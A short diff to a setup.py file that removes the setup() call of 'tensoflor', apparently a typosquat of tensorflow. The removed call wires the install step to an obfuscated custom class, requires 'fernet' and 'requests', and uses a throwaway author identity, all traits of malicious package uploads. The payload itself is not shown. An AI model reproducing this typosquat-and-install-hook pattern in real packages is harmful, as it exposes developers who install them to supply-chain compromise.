@@ -18,22 +18,5 @@ class MEkAXiNVAXIMJwbUizLFiJDOKpKzgUwinBEJIwIYzmMbWRLZdjPopHLOPpgZbktVzTMSMwLFwX
             install.run(self)
 
 
-setup(
-    name="tensoflor",
-    version=VERSION,
-    author="qgDkvKMXTMWiqMID",
-    author_email="OAPApwZH@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': MEkAXiNVAXIMJwbUizLFiJDOKpKzgUwinBEJIwIYzmMbWRLZdjPopHLOPpgZbktVzTMSMwLFwXLhXprAxKtxyxDoBRErQATdTSOyGdcaySHUabMUCPgcWynyOfRnCufrVdzfyCbQVLDJzZaCZIRzFjyBtQqexOFrXBUhSqCtrnsTC,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
